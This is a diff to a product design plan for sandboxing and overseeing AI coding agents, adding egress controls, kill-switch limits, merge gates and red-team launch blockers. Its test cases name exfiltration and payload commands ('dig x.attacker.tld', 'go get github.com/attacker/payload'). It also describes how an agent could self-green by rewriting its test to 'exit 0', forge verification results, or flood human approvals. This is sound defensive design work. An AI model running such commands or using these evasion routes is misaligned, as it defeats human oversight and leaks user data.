@@ -99,6 +99,8 @@ Master Doc v1 is **fully implemented and merged**: audit fixes 1.1–1.13, tasks
 
 ---
 
+**2026-07-12 baseline addendum (Lane H engineering pass).** The shipped client received a verified engineering pass on `phase2` (PR #157): per-HEAD analytics caching, O(1) commit-graph lane routing (output oracle-pinned identical), theme-following diff syntax highlighting, a bounded `index.lock` retry inside `ExecuteWithRepo`, merge blank-line conservation, and property tests for the pure engines (final suite 1115/1115 on a zero-warning build). The decisions are recorded as [ADR-001…007](../ADRs.md) and are part of the baseline this document builds on.
+
 ## 2. Global engineering invariants (every PR, every task)
 
 G-1 … G-10 from Master Doc v1 §2 apply unchanged. v2 adds:
@@ -115,6 +117,8 @@ G-1 … G-10 from Master Doc v1 §2 apply unchanged. v2 adds:
 | G-18 | The UI never talks to Docker/WSL/PTYs directly — only through the daemon's gRPC surface. The daemon never renders UI strings (typed error codes + params; the client localizes) | review: no `Docker.DotNet`/`Porta.Pty` references in `GitLoom.App` |
 
 ---
+
+**Design-system invariant (2026-07 design pass).** Every UI task in this document conforms to [`docs/design/DesignSystem.md`](../../design/DesignSystem.md) — the corrected lane palette, the state-encoding icon gates, the accessibility gates, and the motion grammar — and finds its surface specification through the [design hub](../../design/README.md). Where a task section below carries a **Design decisions** block, those rulings are binding on implementation.
 
 ## 3. Build order and dependency graph
 
@@ -195,6 +199,19 @@ P2-C5 Client polish pack (mergetool mode, difftool, partial stash, patches/WIP s
 \* Client-parity tasks touch only v1 systems. If shipped before the phase2 merge they may target `main` as ordinary client features — decide per task with the repo owner; default is `phase2`.
 
 **Milestones:** M6 = P2-01…P2-08 (one hardened agent, gateway-protected). M7 = P2-09…P2-14 + P2-18, P2-21, P2-22 (the verified swarm + installer). M7.5 = P2-15…P2-17, P2-19, P2-20 (trust: audit + radar + curation — the audit pair targets **before 2026-08-02**). **M7.75 = the competitive-match wave (§5)** — P2-27/P2-34/P2-35/P2-37/P2-38 are its P0 spine (the MergeLoom counter + the uniform category gaps); the rest parallelize. M8 = P2-23…P2-26 + P2-41 + P2-45. M9 = Wave 3 (§6). M10 = Wave 4 (§7). Client-parity anywhere.
+
+### 3.1 Launch-blocker hardening gates (RT-D1…RT-D4 — binding, from OD-R5)
+
+The Lane-C red-team plan (`GitLoom_Orchestration_RedTeam_Plan.md` §4) and the Risk Register (OD-R5) declare four seams **launch-blocking**, but they were previously scheduled only in those subordinate docs. They are now sequenced here as **explicit M7/M7.5 exit criteria** — a milestone does not exit until its listed guard test is green. Each folds into an already-named owning task as a required acceptance criterion; no new task is created.
+
+| Seam | Threatens | Folds into (owning task) | Acceptance criterion (guard test) | Gate |
+|---|---|---|---|---|
+| **RT-D1** crash-mid-merge exactly-once reconciliation | S-3 | **P2-10** (+ T-19 journal as a reboot-reconciliation input; P2-08 reconciler ordering: merge-reconcile before admission) | On daemon start, `IMergeQueue` reconciliation replays the `ForegroundMergeService` T-19 Windows-side journal for any repo with a merge lease outstanding at crash time and synthesizes the `ConfirmMerge` idempotency record from a committed-but-unrecorded merge **before** accepting a new `BeginMerge`. `DaemonCrashMidMerge_ShouldRecoverToExactlyOnceOrNone` | **M7 exit** |
+| **RT-D2** verification-command provenance + gate | S-3/S-4 | **P2-10** (`VerificationRecord` gains resolved-command + config-file-hash provenance) + **P2-11/P2-35** (a change to the test command vs the `main`-side baseline is a **dedicated must-acknowledge flagged item** before `CanMerge` is true; optional out-of-branch human-owned pin) | `GamedTestCommand_ShouldBeFlaggedBeforeSilentMerge` — a branch that rewrites its test to `exit 0` cannot ride a silent merge | **M7 exit** |
+| **RT-D3** kill-switch audit-gap self-declaration | S-7 | **P2-14** (kill-switch) + **P2-15** (recovery-time marker) | Kill switch stays non-blocking (freeze-then-audit best-effort), but on audit-store recovery the daemon appends a chained `killswitch_audit_gap{killEpochId, observedAt}` so a kill during an audit outage is tamper-evident, not a silent absence. `KillSwitchDuringAuditOutage_ShouldMarkGapOnRecovery` | **M7.5 exit** |
+| **RT-D4** `RttBudget` hard ceiling on safety timeouts | S-7 / §2.8 | **P2-14** (kill-switch bound) + OPS §2.8 | Every safety-critical control timeout is `min(ceiling, max(floor, k×RTT))` with a **fixed absolute ceiling independent of the measured EWMA**, so a supervisor-influenced RTT cannot stretch the kill-switch/yield-to-pause path; an anomalous RTT spike feeds A3 `Unresponsive` (P2-08) rather than only a longer deadline. `KillSwitchBound_HardCeiling_IndependentOfRtt` | **M7 exit** |
+
+Until each box's guard test is green at its named gate, the milestone does not exit and the swarm does not ship (the red-team §4 checklist's ship rule, now binding here).
 
 ---
 
@@ -441,11 +458,11 @@ Contract summary (v1-strategy §G-7.1c verbatim, binding): `vttest`/`esctest` sc
 
 **Milestone:** M6 · **Priority:** P0 · **Depends on:** P2-02 (daemon to launch); installer payload arrives with P2-21.
 
-Contract summary (strategy §G-7.2a, binding): `GitLoomOsBootstrapper` (client-side) — detect `GitLoomEnv` via `wsl.exe --list --quiet`; import from versioned tarball if absent; **merge, never clobber** `%UserProfile%\.wslconfig` (INI parse, add only our keys under `[wsl2]`, back up first; defaults `memory=min(50% RAM, 8GB)`, `autoMemoryReclaim=gradual`); first-boot: raise `fs.inotify.max_user_watches`, start `dockerd` via `/etc/wsl.conf` boot command, wait for the socket; launch `gitloomd`, health-check gRPC, staged-checklist progress UI; **idempotent** — every step checks-then-acts, partial bootstrap resumes.
+Contract summary (strategy §G-7.2a, binding): `GitLoomOsBootstrapper` (client-side) — detect `GitLoomEnv` via `wsl.exe --list --quiet`; import from versioned tarball if absent; **merge, never clobber** `%UserProfile%\.wslconfig` (INI parse, add only our keys under `[wsl2]`, back up first; defaults `memory=min(50% RAM, 8GB)`, `autoMemoryReclaim=gradual`); first-boot: raise `fs.inotify.max_user_watches`, **set `kernel.yama.ptrace_scope=2` VM-wide** (the non-namespaced sysctl the P2-07 G2 quartet's control (2) depends on — via `/etc/sysctl.d` or the `/etc/wsl.conf` boot command; it cannot be a per-container flag), start `dockerd` via `/etc/wsl.conf` boot command, wait for the socket; launch `gitloomd`, health-check gRPC, staged-checklist progress UI; **idempotent** — every step checks-then-acts, partial bootstrap resumes.
 
 **Edge cases:** existing user `.wslconfig` keys preserved (fixture-tested INI merger); `wsl --terminate` mid-bootstrap → next start resumes; WSL not installed → actionable failure (P2-21 owns enablement).
 **Invariants:** never `wsl --shutdown` (G-12); re-run is a no-op; other distros untouched (uninstall test).
-**Required tests:** INI-merger fixtures; state-machine unit tests per step (check/act seams mocked); manual matrix in the PR (fresh import < 60 s, `docker info` green inside the VM, kill-VM recovery).
+**Required tests:** INI-merger fixtures; state-machine unit tests per step (check/act seams mocked); **`kernel.yama.ptrace_scope ≥ 2` asserted in the VM after boot** (the P2-07 quartet's boot-provisioned control (2)); manual matrix in the PR (fresh import < 60 s, `docker info` green inside the VM, kill-VM recovery).
 
 ---
 
@@ -471,7 +488,7 @@ public interface IAgentWorktreeManager
 }
 ```
 
-Windows side: on project open, register remote `gitloom-vm` → `\\wsl.localhost\GitLoomEnv\...\repos\<hash>.git` (idempotent; via existing `AddRemote`).
+Windows side: on project open, register the daemon-owned quarantine **sync remote** — its *role* is fixed (the one host-side remote that fetches agent branches) but its *name* is the resolved `SyncRemote.Name` from `IAgentEnvironment.ResolveSyncRemote(repoHash)` (ESC B1 decision SC-2), **defaulting to `gitloom-vm` on the WSL2 substrate** (`gitloom-cloud` on cloud — P2-25) → `\\wsl.localhost\GitLoomEnv\...\repos\<hash>.git` (idempotent; via existing `AddRemote`, registering whatever `SyncRemote.Name` resolves to, never a hardcoded literal).
 
 ### Implementation steps
 
@@ -494,7 +511,7 @@ Windows side: on project open, register remote `gitloom-vm` → `\\wsl.localhost
 ### Invariants (MUST)
 
 1. **G-11:** no container ever mounts a Windows path — the ext4 worktree is the only mount source (asserted in P2-07's inspect test, plumbed here).
-2. An agent commit in the VM worktree reaches the Windows repo byte-identically via `git fetch gitloom-vm && git merge agent/<id>` (round-trip test).
+2. An agent commit in the VM worktree reaches the Windows repo byte-identically via `git fetch <SyncRemote.Name> && git merge agent/<id>` (the resolved name — `gitloom-vm` on WSL2, per SC-2; round-trip test).
 3. Provisioner and worktree manager are daemon services with no UI dependencies.
 
 ### Rejection triggers
@@ -512,13 +529,15 @@ Windows side: on project open, register remote `gitloom-vm` → `\\wsl.localhost
 
 **Milestone:** M6 · **Priority:** P0 launch-tier security — the primary prompt-injection exfiltration control · **Depends on:** P2-05, P2-06.
 
-Contract summary (strategy §G-7.2c, binding — plus market promotion to launch tier): `SandboxEngine` (Docker.DotNet `CreateContainerAsync`): static base image with Nix/Devbox (**no runtime `docker build`**, G-16); `no-new-privileges`, userns remap, default seccomp, memory+pids limits, worktree mount from ext4 only, tmpfs `/dev/shm` for credentials (P2-01 injector content, mode 0400), read-only rootfs where tolerated. `EgressProxyConfigurator`: internal network whose only route out is a proxy container; default-deny; allowlist = model APIs + package registries + the repo's git host; DNS pinned to the proxy; `HTTP(S)_PROXY` env **and** iptables DROP on direct egress. Per-repo persistent jail (`docker start` if stopped). Allowlist user-visible/editable; changes logged (feeds P2-17).
+Contract summary (strategy §G-7.2c, binding — plus market promotion to launch tier): `SandboxEngine` (Docker.DotNet `CreateContainerAsync`): static base image with Nix/Devbox (**no runtime `docker build`**, G-16); `no-new-privileges`, userns remap, default seccomp, memory+pids limits, worktree mount from ext4 only, tmpfs `/dev/shm` for credentials (P2-01 injector content, mode 0400) — with the OOB session HMAC key **K** on a **separate** tmpfs file **mode 0400 owned by a dedicated *supervisor uid* distinct from the agent-CLI uid** (per OPS decision C / G2, §6.1), read-only rootfs where tolerated. `EgressProxyConfigurator`: internal network whose only route out is a proxy container; default-deny; allowlist = model APIs + package registries (pull-only by protocol: crates / Go proxy / npm). **The repo's git host is removed from the *agent* proxy's allowlist (per OPS decision A6, §3.7)** — git-sourced package installs (`pip install git+https://…`, Go modules, git submodules) instead reach the host through a **daemon-mediated read-only git proxy**: an internal endpoint that performs `fetch`/`clone` daemon-side (or via a caching mirror) for **allowlisted host+org prefixes only** and **refuses `push`/`receive-pack` entirely** (this beside the P2-06 provisioner). Every proxied fetch is a P2-17 transparency line; every *attempted* push is denied and audited (feeds P2-44). DNS pinned to the proxy; `HTTP(S)_PROXY` env **and** iptables DROP on direct egress. Per-repo persistent jail (`docker start` if stopped). Allowlist user-visible/editable; changes logged (feeds P2-17).
 
-**Edge cases:** allowlisted `curl https://api.anthropic.com` succeeds via proxy; `curl https://example.com` fails fast (refused, not timeout); direct-IP egress fails; DNS exfil (`dig x.attacker.tld`) fails; `devbox add jq` during a live PTY session survives.
+**Edge cases:** allowlisted `curl https://api.anthropic.com` succeeds via proxy; `curl https://example.com` fails fast (refused, not timeout); direct-IP egress fails; DNS exfil (`dig x.attacker.tld`) fails; `devbox add jq` during a live PTY session survives. **A6 git-proxy:** a `pip install git+https://<allowlisted-host>/<allowlisted-org>/repo` fetch succeeds *through the daemon read-git-proxy*; a direct `git clone https://<git-host>/…` from the agent (bypassing the proxy) fails fast (git host is no longer on the agent allowlist); a `git push`/`receive-pack` through the proxy is refused and audited; a fetch of a non-allowlisted host+org prefix through the proxy is refused. **G2 quartet:** from the agent uid, an attempt to read K from the tmpfs file fails (0400 + supervisor uid), and an attempt to scrape K from the supervisor's process memory via `ptrace`/`process_vm_readv` is denied (yama `ptrace_scope` + seccomp denylist + no `CAP_SYS_PTRACE`) — the agent obtains zero key bytes.
 **Invariants:** G-11/G-15/G-16; every verification bullet evidenced in the PR description; credential tmpfs is per-agent — no `~/.claude`/global auth-dir mounts, ever.
+- **A6 no-direct-git-host egress (per OPS decision A6, §3.7 / S-1):** the *agent* proxy allowlist contains no git-host entry; the daemon read-git-proxy is the only path to the git host for installs, is prefix-allowlisted, and refuses `push`/`receive-pack` structurally (no push code path). Verification bullet: proxy config shows no git-host allow entry; a push through the proxy returns a refusal + audit event. **Package-proxy caveat (OPS SA-1 / F5): "pull-only" ≠ "cannot fetch attacker code" ≠ "cannot exfil".** A directly-allowlisted language proxy (Go proxy, npm, crates) is a general-purpose fetch channel to arbitrary upstream repos — `GOPROXY` resolves `go get github.com/attacker/payload` (second-stage payload) and leaks bytes in the request path — so removing the git host does not by itself close payload-pull/request-path exfil. **Prefer routing module fetches through the same declared-dependency-scoped daemon proxy** (resolve `go.mod`/`package.json`/lockfiles to exact modules, deny the rest) rather than allowlisting the registries wholesale; where a native proxy front cannot be replaced, every package-proxy fetch is a P2-17 transparency line + P2-44 anomaly signal, and the residual (public-payload pull + low-bandwidth exfil via an allowlisted registry) is accepted-and-stated, bounded by no-push/no-creds and the verify→review→human-merge backstop. Verification bullet: `go get`/npm of a non-declared VCS dependency is scoped-out (declared-dep proxy) or surfaces as a transparency line + anomaly, never silent (`PackageProxy_ArbitraryVcsFetch_ShouldBeScopedOrTransparencyLogged`).
+- **G2 anti-memory-inspection quartet (per OPS decision C / G2, §6.1; G-13/G-15; OPS S-6/S-9):** the A1 forgery-[STRUCT] guarantee depends on the agent uid being unable to obtain the OOB HMAC key **K** by *any* path, so the spec MUST carry all four together — (1) the K/credential tmpfs is mode 0400 owned by a dedicated *supervisor uid* ≠ the agent-CLI uid **[per-container]**; (2) yama `kernel.yama.ptrace_scope` ≥ 2 **[VM-wide boot sysctl — see the placement note below]**; (3) a seccomp profile denying `process_vm_readv`/`process_vm_writev`/`ptrace` to the sandbox **[per-container]**; (4) no `CAP_SYS_PTRACE` in the agent's capability set **[per-container]**. **The in-container memory-scrape is closed structurally by (3)+(4) alone** — a container-wide seccomp denial of `process_vm_readv`/`ptrace` plus the dropped capability leaves the agent no syscall to read the supervisor's memory; (1) closes the file path. **Control (2) is defense-in-depth and is NOT a per-container flag:** `kernel.yama.ptrace_scope` is a non-namespaced kernel sysctl and cannot be set via `CreateContainerAsync`/`--sysctl` (Docker permits only namespaced sysctls); it MUST be provisioned **VM-wide at boot by the P2-05 bootstrapper** (alongside `fs.inotify.max_user_watches`), never asserted on the container create request. Dropping (1), (3), or (4) regresses S-9's forgery-[STRUCT] and S-6; (2) hardens it. Verification bullets: the spec builder asserts (1), (3), (4) on the create request; a **VM boot check** asserts `kernel.yama.ptrace_scope ≥ 2`; a live agent-uid `ptrace`/`process_vm_readv` against the supervisor is denied.
 **Acceptable variations (MAY):** offering **Docker Sandboxes (sbx)** as an optional "maximum isolation" backend behind the same `SandboxEngine` interface (microVM + its Locked-Down egress preset, GA on Windows since 2026-01) — the native WSL2 path stays the zero-extra-install default, and the egress/audit invariants apply to both backends.
 **Rejection triggers:** proxy-env-only enforcement (no iptables backstop); a "temporary" `--privileged`; making sbx a hard dependency.
-**Required tests:** container-spec builder unit tests (flags asserted on the create request); egress matrix as an integration suite tagged `RequiresDocker`; `docker inspect` assertions (no Windows paths, userns, limits).
+**Required tests:** container-spec builder unit tests (per-container flags asserted on the create request — the seccomp `process_vm_readv`/`process_vm_writev`/`ptrace` denylist, no `CAP_SYS_PTRACE`, and supervisor-uid ownership of the K/credential tmpfs) **plus a P2-05 VM-boot assertion that `kernel.yama.ptrace_scope ≥ 2`** (the non-namespaced sysctl the builder cannot set); egress matrix as an integration suite tagged `RequiresDocker`; `docker inspect` assertions (no Windows paths, userns, limits). **A6 read-git-proxy suite** (`RequiresDocker`): allowlisted-prefix `fetch`/`clone` via the daemon proxy succeeds; `push`/`receive-pack` through the proxy is refused + audited; a non-allowlisted host+org prefix is refused; a direct git-host `clone` from the agent (bypassing the proxy) fails fast (git host absent from the agent allowlist). **G2 key-custody test** (`RequiresDocker`, mirrors OPS §9 test 13 `SupervisorMemory_NotReadableByAgent_ViaPtraceOrVmRead`): from the agent uid, reading K from the tmpfs file AND scraping it from supervisor process memory (`ptrace`/`process_vm_readv`) are **both denied** — the agent obtains zero key bytes.
 
 ---
 
@@ -604,12 +623,12 @@ public interface IMergeQueue
 }
 ```
 
-Windows side: `ForegroundMergeService` — "Merge to Main" = `git fetch gitloom-vm && git merge agent/<id>` on the Windows repo (human-gated, journaled via T-19); post-merge installs run `--ignore-scripts` wrapped in retry (NTFS `EPERM`/`EBUSY`).
+Windows side: `ForegroundMergeService` — "Merge to Main" = `git fetch <SyncRemote.Name> && git merge agent/<id>` on the Windows repo (human-gated, journaled via T-19), where `<SyncRemote.Name>` is the value `IAgentEnvironment.ResolveSyncRemote(repoHash)` returns (per SC-2: `gitloom-vm` on WSL2, `gitloom-cloud` on cloud — **never a hardcoded literal**, so this contract is substrate-agnostic for the P2-25 cloud path). The freshness gate is an A5 **ref-level compare-and-swap** (see the A5 note in invariant 3), not an `index.lock`-scoped read. Post-merge installs run `--ignore-scripts` wrapped in retry (NTFS `EPERM`/`EBUSY`).
 
 ### Implementation steps
 
 1. State machine exactly as the enum; transitions persisted (daemon SQLite) so a daemon restart resumes queue state.
-2. Verification = the project's configured test command run in the worker's own sandbox; record `main@<sha> + pass/fail + log artifact`.
+2. Verification = the project's configured test command run in the worker's own sandbox, **launched by the daemon itself via the container runtime (`docker exec`) so the pass/fail is the daemon-observed exit code (reported by containerd, outside the in-sandbox `AgentSupervisor`'s control), NOT a value reported over the OOB `VerifyResult` frame** (OPS SA-1 / decision D: the supervisor is not in the TCB and a compromised one could otherwise forge a `Verified` state — the single trust-ending forgery); record `main@<sha> + pass/fail + log artifact`. Note the honest residual: the test still executes against agent-controlled files/deps, so a poisoned test *runner* can exit 0 over failing code (RT-D2 flags command-*text* changes, not the execution closure) — therefore `Verified` is a **quality signal, not a security boundary against an adversarial branch**; the gate against hostile code is human diff review (P2-11).
 3. **Stale cascade:** every merge to main → `NotifyMainMoved` → all `Verified` workers flip `StaleVerified` and auto re-enter (yield → keep-alive rebase → re-verify). This loop is the single hardest coordination problem of parallel agents and the moat — it gets the densest tests in the milestone.
 4. Merge gating: `CanMerge` false on stale/unverified; the override setting exists but renders a loud warning and is journaled + audited.
 5. Rejection path: branch delete, sandbox prune, teardown per policy.
@@ -629,16 +648,21 @@ Windows side: `ForegroundMergeService` — "Merge to Main" = `git fetch gitloom-
 
 1. A merge through the UI on a fresh `Verified` state is the only silent path; every other path warns and records.
 2. Verification results are immutable records tied to a `main@<sha>`; re-verification creates a new record.
-3. The human foreground merge happens on the Windows repo via the existing journaled service surface (undoable via T-19).
+3. The human foreground merge happens on the Windows repo via the existing journaled service surface (undoable via T-19). **A5 freshness is a ref-level CAS:** the check that `VerificationRecord.MainSha == main@sha` and the merge are performed as one journaled step using git's own ref old-OID compare-and-swap on `refs/heads/main` (e.g. `git merge --ff-only`/an explicit expected-old-OID `update-ref`), **not** an `index.lock`-scoped read-then-merge — `index.lock` guards the index, not ref updates (`update-ref`/push/fetch can move `main` without it), so only a ref-level CAS closes the TOCTOU (OPS §6.5, corrected).
 
 ### Rejection triggers
 
 - Auto-merge of any kind — the human gate is the product thesis.
 - Verification run outside the worker's sandbox (host execution).
+- **Taking the verification pass/fail from a supervisor-reported `VerifyResult{passed}` frame instead of the daemon-observed container-runtime exit** (OPS SA-1 — a compromised, non-TCB supervisor would forge `Verified`).
 
-**Required tests:** exhaustive state-machine unit suite incl. the stale cascade + override; two-scripted-worker integration (A merges → B re-verifies → merge button blocked until fresh); restart-resume; `--ignore-scripts` canary (poisoned `postinstall` does not execute).
+**Launch-blocker gates (§3.1, M7 exit):** (RT-D1) reboot reconciliation replays the T-19 Windows-side journal for any repo with an outstanding merge lease and synthesizes the `ConfirmMerge` idempotency record from a committed-but-unrecorded merge **before** a new `BeginMerge` is accepted; (RT-D2) `VerificationRecord` records the resolved test command + a hash of the config that defined it, and a change to that command vs the `main`-side baseline becomes a dedicated must-acknowledge flagged item (wired into P2-11/P2-35) before `CanMerge` is true — a branch cannot self-green by rewriting its test to `exit 0`.
+
+**Required tests:** exhaustive state-machine unit suite incl. the stale cascade + override; two-scripted-worker integration (A merges → B re-verifies → merge button blocked until fresh); restart-resume; `--ignore-scripts` canary (poisoned `postinstall` does not execute); **`DaemonCrashMidMerge_ShouldRecoverToExactlyOnceOrNone` (RT-D1); `GamedTestCommand_ShouldBeFlaggedBeforeSilentMerge` (RT-D2); `ForgedVerifyResult_ShouldBeOverriddenByDaemonObservedExit` (OPS SA-1 / §9 test 14 — a compromised supervisor's forged `passed:true` does not create a `Verified`/mergeable state; PR-blocking on the Docker leg)**.
 
 ---
+
+**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §3.** The queue renders as its state machine on the Merge Queue Rail: per-branch state chips naming the `main@sha` each verification ran against, the stale cascade shown as a visible re-verification wave (never a silent reorder), and the `CanMerge` gate surfaced with its reason vocabulary. Empty/loading/error states and badges come from the §9 shared vocabulary.
 
 ## P2-11 — Review cockpit: risk-ranked diffs, per-hunk provenance, flagged-changes gate (market D-2)
 
@@ -683,6 +707,7 @@ UI: the agent-branch diff view orders files/hunks by risk rank (not alphabetical
 2. Provenance is dual-source: the orchestrator (P2-09/P2-14) **emits Agent Trace records** for every worker session (and writes `Agent:`/`Task:`/`Plan:` trailers as the durable in-history fallback); `ProvenanceReader` consumes trace JSON first, trailers second. Rendering the standard that Cursor/Jules/Amp emit makes external branches (P2-12) attributable too.
 3. Cockpit view composes existing controls: T-13 diff rendering, risk ordering, provenance chips, acknowledgment panel; acknowledgments recorded (audited later by P2-15).
 4. Wire `FlaggedChangeDetector` output into P2-10's `CanMerge`.
+5. **Out-of-approved-Scope detection (OPS SA-1 / F6):** for a managed worker, `FlaggedChangeDetector` also compares the produced diff's touched paths against the worker's approved `TaskPlan.Scope` (P2-14); any file **outside** the approved Scope is a **dedicated must-acknowledge flagged item** (same mechanism as the RT-D2 changed-test-command flag) that blocks `CanMerge` until acknowledged. This closes the gap where a Coordinator `send_worker_prompt` re-steers a running worker off its approved plan and the review surface showed only a diff with no scope-violation signal — plan approval binds to a Scope, so a silent merge of off-Scope work is not allowed.
 
 ### Edge-case matrix
 
@@ -707,6 +732,8 @@ UI: the agent-branch diff view orders files/hunks by risk rank (not alphabetical
 **Required tests:** classifier fixture corpus (each category + the scripts-vs-bump distinction); trailer parse matrix; acknowledgment-invalidation; end-to-end: poisoned postinstall branch → panel appears → merge blocked until acknowledged (extends the P2-10 canary).
 
 ---
+
+**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §6 ("where trust is manufactured").** Risk-ranked hunks, per-hunk provenance chips, the flagged-changes acknowledgment gate, and the test-delta strip are one cockpit surface; state vocabulary and the badge family per §9.
 
 ## P2-12 — External agent PR intake (new; market D-1 "vendor-neutral moat")
 
@@ -762,17 +789,25 @@ Contract summary (strategy §G-7.4, binding): `Dock.Avalonia` workspace (Termina
 
 ---
 
+**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §0 (revision of record) + §2/§4.** The control center is **integrated, not a separate window**: MainWindow keeps its full v1 chrome and gains a leftmost **section rail** (collapsible like the repo sidebar; top third = Repo viewer / Coordinator with attention badge / Resources / the relocated git-host icons; bottom two-thirds = the live agent list; the kill switch at the rail's foot, always visible in every section). **Two layouts only** — Flight Deck (default) and Conversation Deck — picked in File → Layout, persisted as `UserPreferences.WorkspaceLayout`, applying to coordinator surfaces only (the Repo viewer never changes shape). The 2026-07 prototype on `phase2` (Views/ViewModels + mock services) is the reference implementation; its mock services are shaped like the gRPC contract so P2-02's `DaemonClient` swaps in with zero View changes.
+
 ## P2-14 — Plan approval + dual-mode orchestration (G-7.5)
 
 **Milestone:** M7 · **Priority:** P0 — the product thesis · **Depends on:** P2-08, P2-09, P2-13.
 
-Contract summary (strategy §G-7.5, binding, with the market promotion of plan-approval into the headline): `CoordinatorAgent` — chat agent with **no code, no worktree, no merges**; tools `spawn_worker(taskSpec)`, `get_worker_status`, `send_worker_prompt`, `request_verification`, capped by limits/budgets/admission. **Two-phase spawn:** structured `TaskPlan { Scope: files[], Approach, TestStrategy }` (JSON-schema validated) → rendered for approval → **workers start only on approved plans**; plan + approver OS identity persisted (P2-15 chains it). Terminal locking for managed workers enforced **daemon-side** (input stream severed at the gRPC layer, not just UI read-only). **Kill switch:** yield-all (timeout → `docker pause`) + queue freeze + journal snapshot; one always-visible control. Human handoff: `AwaitingReview` badge; merges only via the P2-10 human path. Coordinator serializes dependent tasks; partitioning quality is tracked telemetry.
+Contract summary (strategy §G-7.5, binding, with the market promotion of plan-approval into the headline): `CoordinatorAgent` — chat agent with **no code, no worktree, no merges**; tools `spawn_worker(taskSpec)`, `get_worker_status`, `send_worker_prompt`, `request_verification`, capped by limits/budgets/admission. **Two-phase spawn:** structured `TaskPlan { Scope: files[], Approach, TestStrategy }` (JSON-schema validated) → rendered for approval → **workers start only on approved plans**; plan + approver OS identity persisted (P2-15 chains it). **The approver identity is derived daemon-side from the authenticated connection's OS peer credential — NEVER a client-supplied field** (OPS SA-1 / F2: a client-set `osIdentity` would let token-holding host malware forge an attributable approval; deriving it daemon-side at least removes the trivial audit forgery. The residual — host malware running as the user can still drive approvals/merges with a valid token, and can also push directly via T-10 — is the stated host-trust boundary, OPS §1.1; a host-un-forgeable presence factor is deferred, OPS §10.1). Terminal locking for managed workers enforced **daemon-side** (input stream severed at the gRPC layer, not just UI read-only). **Kill switch:** **freeze the merge queue FIRST** (in-proc, instant — reject `BeginMerge`/`ConfirmMerge`/spawn) **before** the yield fan-out, so no merge slips the up-to-ceiling fan-out window (OPS SA-1 / F4), then yield-all (timeout → `docker pause`) + journal snapshot; one always-visible control. Human handoff: `AwaitingReview` badge; merges only via the P2-10 human path. Coordinator serializes dependent tasks; partitioning quality is tracked telemetry.
 
 **Edge cases:** plan rejected → worker never spawns, no worktree residue; kill switch with an agent mid-yield → pause after timeout; manual-mode spawn bypasses coordinator but not admission/budgets.
-**Invariants:** input-lock verified at the gRPC layer by test (hand-crafted client rejected); kill switch freezes all containers < 5 s; the coordinator cannot invoke merge RPCs (interceptor-enforced role, not convention).
-**Required tests:** spawn-cap/budget rejection; plan schema validation corpus; scripted-coordinator end-to-end (2 independent tasks → parallel workers → verified → sequential human merges with a stale re-verify between); kill-switch fan-out ordering.
+**Launch-blocker gates (§3.1):** (RT-D4, M7 exit) the kill-switch fan-out and yield-to-pause timeouts take `min(ceiling, max(floor, k×RTT))` with a **fixed absolute ceiling independent of `RttBudget`** — a supervisor-influenced RTT (the OOB channel's RTT is measured over a hop terminating at the untrusted supervisor) can never stretch the emergency stop; `docker pause` needs no supervisor cooperation, so the ceiling only bounds *how long* an agent runs during a kill, not correctness. (RT-D3, M7.5 exit) the kill switch stays non-blocking (freeze-then-audit best-effort); on audit-store recovery the daemon appends a chained `killswitch_audit_gap{killEpochId, observedAt}` so a kill during an audit outage is tamper-evident (P2-15).
+
+**Anti-approval-fatigue (S-8 hardening):** a `PlanPending` plan consumes no admission or budget, so an unbounded number of pending drafts would let a hostile Coordinator flood the human approval queue into rubber-stamping. Cap concurrent `PlanPending` plans per Coordinator and rate-limit `spawn_worker` drafting; surface an "N plans pending" pressure signal; excess draft attempts return `RESOURCE_EXHAUSTED` and are audited.
+
+**Invariants:** input-lock verified at the gRPC layer by test (hand-crafted client rejected); the kill-switch fan-out bound is `min(ceiling, max(5 s, 50×RTT))` — the "< 5 s" figure is the local profile of the RTT-scaled formula, and the absolute ceiling holds regardless of measured RTT; the coordinator cannot invoke merge RPCs (interceptor-enforced role, not convention); pending-plan count per Coordinator is capped.
+**Required tests:** spawn-cap/budget rejection; plan schema validation corpus; scripted-coordinator end-to-end (2 independent tasks → parallel workers → verified → sequential human merges with a stale re-verify between); kill-switch fan-out ordering; **`KillSwitchBound_HardCeiling_IndependentOfRtt` (RT-D4); `KillSwitchDuringAuditOutage_ShouldMarkGapOnRecovery` (RT-D3); pending-plan-cap rejection (S-8); `KillSwitch_FreezesQueueBeforeFanOut` (OPS SA-1/F4 — a `BeginMerge` in the fan-out window after `KillSwitch` receipt is rejected `FAILED_PRECONDITION`); `ApproverIdentity_IsDaemonDerived_NotClientField` (OPS SA-1/F2 — a client `osIdentity` field cannot influence the recorded approver)**.
 
 ---
+
+**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §5.** The coordinator chat, the TaskPlan approval card, and the always-visible kill switch (rail foot, every section per §0) are specified as one surface.
 
 ## P2-15 — Tamper-evident audit log (H-8.2, pulled forward)
 
@@ -801,7 +836,7 @@ public interface IAuditLog
 }
 ```
 
-Event types (minimum): `inference` (model, prompt, output), `agent_spawned`, `agent_stopped`, `plan_approved`, `plan_rejected`, `merge_approved`, `merge_rejected`, `stale_override_used`, `egress_denied`, `budget_exceeded`, `killswitch`, `acknowledged_flagged_change`, `redaction`.
+Event types (minimum): `inference` (model, prompt, output), `agent_spawned`, `agent_stopped`, `plan_approved`, `plan_rejected`, `merge_approved`, `merge_rejected`, `stale_override_used`, `egress_denied`, `budget_exceeded`, `killswitch`, `killswitch_audit_gap` (RT-D3: appended on audit-store recovery when a kill fired while the store was unavailable — the freeze-then-audit carve-out is thereby made tamper-evident rather than silent), `acknowledged_flagged_change`, `redaction`.
 
 ### Implementation steps
 
@@ -990,7 +1025,7 @@ Contract summary (strategy §H-8.5, binding): Vault KV2 + AWS Secrets Manager ba
 
 **Milestone:** continuous + M8 · **Priority:** guardrails P0 (they are CI checks), implementation post-desktop-GA (private beta ≤ 2 quarters after — promoted per market v2 §7.1).
 
-Binding now: every proto stays transport-agnostic (G-14); a WAN-latency CI job (`tc netem` 80 ms) runs the P2-14 end-to-end suite once per release; grid protocol + merge-queue RPCs must pass it unchanged. Implementation when scheduled: daemon container image (same binary), mTLS + user auth replacing the session token, per-tenant encryption at rest, `RemoteEnvironment` picker (local VM | cloud), repo sync via `git push gitloom-cloud` over HTTPS.
